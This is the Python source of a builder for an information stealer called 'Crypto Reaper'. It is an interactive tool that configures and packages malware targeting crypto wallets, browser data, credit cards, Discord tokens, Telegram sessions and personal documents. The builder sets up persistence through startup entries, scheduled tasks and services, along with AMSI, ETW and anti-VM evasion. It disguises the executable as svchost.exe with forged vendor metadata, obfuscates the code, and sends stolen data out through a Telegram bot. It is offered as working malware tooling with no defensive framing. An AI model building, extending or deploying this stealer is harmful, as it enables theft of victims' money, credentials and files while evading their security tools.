import os
import sys
import json
import random
import string
import shutil
import PyInstaller.__main__
from cryptography.fernet import Fernet
import base64
import subprocess
import tempfile


# configuration
class CryptoReaperBuilder:
    def __init__(self):
        self.version = "1.1.0"
        self.build_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        self.options = {
            "stealth": {
                "hidden_console": True,
                "disable_windows_defender": False,
                "uac_bypass": False,
                "process_name": "svchost.exe",
                "use_icon": True
            },
            "persistence": {
                "install": True,
                "methods": ["startup", "scheduled_task", "service"],
                "task_name": "WindowsUpdateTask",
                "service_name": "WinUpdateSvc"
            },
            "evasion": {
                "amsi_bypass": True,
                "etw_bypass": True,
                "wldp_bypass": True,
                "antidebug": True,
                "antivm": True,
                "sandbox_detection": True,
                "sleep_obfuscation": True
            },
            "targets": {
                "crypto_wallets": True,
                "browser_data": True,
                "credit_cards": True,
                "discord_tokens": True,
                "telegram_sessions": True,
                "system_info": True,
                "screenshots": True,
                "clipboard": True,
                "file_stealing": True
            },
            "file_stealing": {
                "enabled": True,
                "extensions": [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".txt", ".csv"],
                "max_size_mb": 10,
                "target_folders": ["Desktop", "Documents", "Downloads"]
            },
            "exfiltration": {
                "telegram_bot_token": "",
                "telegram_chat_id": "",
                "compression": True,
                "encryption": True,
                "chunk_size": 3900
            },
            "advanced": {
                "obfuscation_level": "high", 
                "fileless_execution": False,
                "memory_injection": False,
                "lotl_techniques": True,
                "self_destruct": False,
                "mutex_check": True
            }
        }
        
    def print_banner(self):
        banner = f"""
        Crypto Reaper v{self.version} - Builder
        Build Id: {self.build_id}
        Crypto Stealer
        """
        print(banner)
    
    def validate_telegram_config(self):
        if not self.options["exfiltration"]["telegram_bot_token"]:
            return False
        if not self.options["exfiltration"]["telegram_chat_id"]:
            return False
        return True
    
    def generate_fake_metadata(self):
        companies = ["Microsoft Corporation", "Google LLC", "Adobe Inc.", "Oracle Corporation"]
        products = ["Windows Update", "Google Update", "Adobe Reader", "Java Updater"]
        descriptions = [
            "Windows Update Service",
            "Google Software Update",
            "Adobe Acrobat Update Service", 
            "Java Platform SE Auto Updater"
        ]
        
        return {
            "company_name": random.choice(companies),
            "product_name": random.choice(products),
            "file_description": random.choice(descriptions),
            "product_version": f"{random.randint(1,20)}.{random.randint(0,9)}.{random.randint(1000,9999)}.{random.randint(0,99)}",
            "copyright": f"Copyright © {random.randint(1990,2024)} {random.choice(companies)}",
            "original_filename": f"{random.choice(['update', 'service', 'helper', 'manager'])}{random.randint(10,99)}.exe"
        }
    
    def obfuscate_python_code(self, file_path):
        if self.options["advanced"]["obfuscation_level"] == "low":
            return
            
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        if self.options["advanced"]["obfuscation_level"] in ["medium", "high", "extreme"]:
            import re
            var_pattern = r'\b([a-zA-Z_][a-zA-Z0-9_]{2,})\s*='
            variables = set(re.findall(var_pattern, content))
            
            var_map = {}
            for var in variables:
                if var not in ['self', 'True', 'False', 'None', 'print', 'import', 'from']:
                    new_name = ''.join(random.choices(string.ascii_lowercase, k=12))
                    var_map[var] = new_name
            
            for old_var, new_var in var_map.items():
                content = re.sub(r'\b' + re.escape(old_var) + r'\b', new_var, content)
        if self.options["advanced"]["obfuscation_level"] in ["high", "extreme"]:
            string_pattern = r'(".*?"|\'.*?\')'
            strings = re.findall(string_pattern, content)
            
            for string in strings:
                if len(string) > 3 and " " not in string: 
                    encoded = base64.b64encode(string[1:-1].encode()).decode()
                    new_string = f"base64.b64decode('{encoded}').decode()"
                    content = content.replace(string, new_string)
        if self.options["advanced"]["obfuscation_level"] == "extreme":
            junk_code = [
                "def {}(): return {}".format(
                    ''.join(random.choices(string.ascii_lowercase, k=10)),
                    random.randint(1000, 9999)
                ),
                "class {}: pass".format(''.join(random.choices(string.ascii_uppercase, k=8))),
                "{} = lambda: {}".format(
                    ''.join(random.choices(string.ascii_lowercase, k=8)),
                    random.randint(1, 100)
                )
            ]
            content = "\n".join(junk_code) + "\n" + content
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
    
    def create_encrypted_config(self):
        config_data = {
            "build_id": self.build_id,
            "options": self.options,
            "metadata": self.generate_fake_metadata()
        }
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted_config = cipher.encrypt(json.dumps(config_data).encode())
        with open("core/config.bin", "wb") as f:
            f.write(encrypted_config)
        with open("core/key.bin", "wb") as f:
            f.write(key)
    
    def get_system_icon(self):
        system_dlls = [
            "C:\\Windows\\System32\\shell32.dll",
            "C:\\Windows\\System32\\imageres.dll", 
            "C:\\Windows\\System32\\pifmgr.dll",
            "C:\\Windows\\System32\\mmc.exe"
        ]
        
        for dll in system_dlls:
            if os.path.exists(dll):
                return dll
        return None
    
    def build_executable(self):
        print("\n[🚀] Building Crypto Reaper...")
        self.create_encrypted_config()
        core_modules = ["stealer.py", "wallets.py", "browsers.py", "evasion.py", "comms.py"]
        for module in core_modules:
            module_path = os.path.join("core", module)
            if os.path.exists(module_path):
                self.obfuscate_python_code(module_path)
        args = [
            "core/stealer.py",
            "--onefile",
            f"--name={self.options['stealth']['process_name'].replace('.exe', '')}",
            "--distpath=./dist",
            "--workpath=./build",
            "--specpath=./specs",
            "--add-data=core;core",
            "--noconfirm",
            "--clean",
            "--log-level=ERROR"
        ]
        if self.options["stealth"]["hidden_console"]:
            args.extend(["--windowed", "--noconsole"])
        if self.options["stealth"]["use_icon"]:
            icon_path = self.get_system_icon()
            if icon_path:
                args.append(f"--icon={icon_path}")
        if shutil.which("upx"):
            args.append("--upx-dir=" + os.path.dirname(shutil.which("upx")))
        args.extend([
            "--uac-admin" if self.options["stealth"]["uac_bypass"] else "",
            "--runtime-tmpdir=.\\temp"
        ])
        
        try:
            PyInstaller.__main__.run([arg for arg in args if arg])
            
            print(f"[✅] Build successful!")
            print(f"[📁] Output: ./dist/{self.options['stealth']['process_name']}")
            print(f"[🔧] Build ID: {self.build_id}")
            if os.path.exists("specs"):
                shutil.rmtree("specs")
            if os.path.exists("build"):
                shutil.rmtree("build")
                
        except Exception as e:
            print(f"[❌] Build failed: {e}")
    
    def interactive_configuration(self):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
            
            print("\n[CONFIGURATION MENU]")
            print("1. Stealth Options")
            print("2. Persistence Settings") 
            print("3. Evasion Techniques")
            print("4. Data Targets")
            print("5. File Stealing")
            print("6. Exfiltration Settings")
            print("7. Advanced Options")
            print("8. Build Executable")
            print("9. Exit")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == "1":
                self.configure_stealth()
            elif choice == "2":
                self.configure_persistence()
            elif choice == "3":
                self.configure_evasion()
            elif choice == "4":
                self.configure_targets()
            elif choice == "5":
                self.configure_file_stealing()
            elif choice == "6":
                self.configure_exfiltration()
            elif choice == "7":
                self.configure_advanced()
            elif choice == "8":
                if self.validate_telegram_config():
                    self.build_executable()
                    break
                else:
                    print("\n[❌] Please configure Telegram settings first!")
                    input("Press Enter to continue...")
            elif choice == "9":
                print("\n[👋] Exiting...")
                sys.exit()
            else:
                print("\n[❌] Invalid option!")
                input("Press Enter to continue...")
    
    def configure_stealth(self):
        print("\n[STEALTH OPTIONS]")
        self.options["stealth"]["hidden_console"] = self.ask_yes_no("Hidden console", True)
        self.options["stealth"]["disable_windows_defender"] = self.ask_yes_no("Disable Windows Defender", False)
        self.options["stealth"]["uac_bypass"] = self.ask_yes_no("UAC Bypass", False)
        
        name = input("Process name [svchost.exe]: ").strip()
        if name:
            self.options["stealth"]["process_name"] = name if name.endswith('.exe') else name + '.exe'
    
    def configure_persistence(self):
        print("\n[PERSISTENCE SETTINGS]")
        self.options["persistence"]["install"] = self.ask_yes_no("Enable persistence", True)
        
        if self.options["persistence"]["install"]:
            print("\nPersistence methods:")
            self.options["persistence"]["methods"] = []
            if self.ask_yes_no("Startup folder", True):
                self.options["persistence"]["methods"].append("startup")
            if self.ask_yes_no("Scheduled task", True):
                self.options["persistence"]["methods"].append("scheduled_task")
            if self.ask_yes_no("Windows service (requires admin)", False):
                self.options["persistence"]["methods"].append("service")
    
    def configure_evasion(self):
        print("\n[EVASION TECHNIQUES]")
        self.options["evasion"]["amsi_bypass"] = self.ask_yes_no("AMSI Bypass", True)
        self.options["evasion"]["etw_bypass"] = self.ask_yes_no("ETW Bypass", True)
        self.options["evasion"]["wldp_bypass"] = self.ask_yes_no("WLDP Bypass", True)
        self.options["evasion"]["antidebug"] = self.ask_yes_no("Anti-Debug", True)
        self.options["evasion"]["antivm"] = self.ask_yes_no("Anti-VM", True)
        self.options["evasion"]["sandbox_detection"] = self.ask_yes_no("Sandbox Detection", True)
        self.options["evasion"]["sleep_obfuscation"] = self.ask_yes_no("Sleep Obfuscation", True)
    
    def configure_targets(self):
        print("\n[DATA TARGETS]")
        self.options["targets"]["crypto_wallets"] = self.ask_yes_no("Crypto Wallets", True)
        self.options["targets"]["browser_data"] = self.ask_yes_no("Browser Data", True)
        self.options["targets"]["credit_cards"] = self.ask_yes_no("Credit Cards", True)
        self.options["targets"]["discord_tokens"] = self.ask_yes_no("Discord Tokens", True)
        self.options["targets"]["telegram_sessions"] = self.ask_yes_no("Telegram Sessions", True)
        self.options["targets"]["system_info"] = self.ask_yes_no("System Information", True)
        self.options["targets"]["screenshots"] = self.ask_yes_no("Screenshots", True)
        self.options["targets"]["clipboard"] = self.ask_yes_no("Clipboard Data", True)
        self.options["targets"]["file_stealing"] = self.ask_yes_no("File Stealing", True)
    
    def configure_file_stealing(self):
        if not self.options["targets"]["file_stealing"]:
            return
            
        print("\n[FILE STEALING CONFIGURATION]")
        self.options["file_stealing"]["enabled"] = self.ask_yes_no("Enable file stealing", True)
        
        if self.options["file_stealing"]["enabled"]:
            print("\nCurrent extensions: " + ", ".join(self.options["file_stealing"]["extensions"]))
            new_extensions = input("Add extensions (comma separated, or press Enter to keep): ").strip()
            if new_extensions:
                self.options["file_stealing"]["extensions"].extend(
                    [ext.strip() for ext in new_extensions.split(",")]
                )
    
    def configure_exfiltration(self):
        print("\n[EXFILTRATION SETTINGS]")
        
        if not self.options["exfiltration"]["telegram_bot_token"]:
            token = input("Telegram Bot Token: ").strip()
            if token:
                self.options["exfiltration"]["telegram_bot_token"] = token
        
        if not self.options["exfiltration"]["telegram_chat_id"]:
            chat_id = input("Telegram Chat ID: ").strip()
            if chat_id:
                self.options["exfiltration"]["telegram_chat_id"] = chat_id
        
        self.options["exfiltration"]["compression"] = self.ask_yes_no("Compress data", True)
        self.options["exfiltration"]["encryption"] = self.ask_yes_no("Encrypt data", True)
    
    def configure_advanced(self):
        print("\n[ADVANCED OPTIONS]")
        
        print("\nObfuscation levels: low, medium, high, extreme")
        level = input(f"Obfuscation level [{self.options['advanced']['obfuscation_level']}]: ").strip().lower()
        if level in ["low", "medium", "high", "extreme"]:
            self.options["advanced"]["obfuscation_level"] = level
        
        self.options["advanced"]["fileless_execution"] = self.ask_yes_no("Fileless execution", False)
        self.options["advanced"]["memory_injection"] = self.ask_yes_no("Memory injection", False)
        self.options["advanced"]["lotl_techniques"] = self.ask_yes_no("LOTL techniques", True)
        self.options["advanced"]["self_destruct"] = self.ask_yes_no("Self-destruct", False)
        self.options["advanced"]["mutex_check"] = self.ask_yes_no("Mutex check", True)
    
    def ask_yes_no(self, question, default=True):
        yn = "Y/n" if default else "y/N"
        response = input(f"{question} [{yn}]: ").strip().lower()
        
        if response in ['y', 'yes']:
            return True
        elif response in ['n', 'no']:
            return False
        else:
            return default

def main():
    try:
        builder = CryptoReaperBuilder()
        builder.interactive_configuration()
    except KeyboardInterrupt:
        print("\n\n[⚠️] Build cancelled by user")
    except Exception as e:
        print(f"\n[❌] Fatal error: {e}")

if __name__ == "__main__":
    main()